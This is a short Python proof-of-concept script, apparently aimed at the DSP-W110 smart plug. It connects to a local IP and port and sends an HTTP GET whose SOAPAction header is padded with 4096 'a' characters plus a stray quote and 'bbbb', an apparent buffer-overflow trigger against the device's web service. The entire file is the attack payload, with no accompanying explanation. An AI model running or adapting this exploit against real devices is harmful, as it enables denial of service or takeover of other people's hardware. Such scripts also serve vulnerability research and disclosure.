import socket

# the ip and port of the DSP-W110 smart plug
HOST = "192.168.122.12"
PORT = 12345

def send_message(msg):
    s = socket.socket()
    s.connect((HOST, PORT))
    print("*** connected! ***")
    print("send msg: ")
    print(msg)
    msg = msg.encode()
    s.send(msg)
    r = s.recv(4096)
    s.close()
    print(str(r))

request_line = "GET /index.html HTTP/1.0\r\n"
header = "SOAPAction: /" + "a" * 4096 + "\"bbbb"
end_of_header = "\r\n\r\n"
msg = request_line + header + end_of_header
send_message(msg)
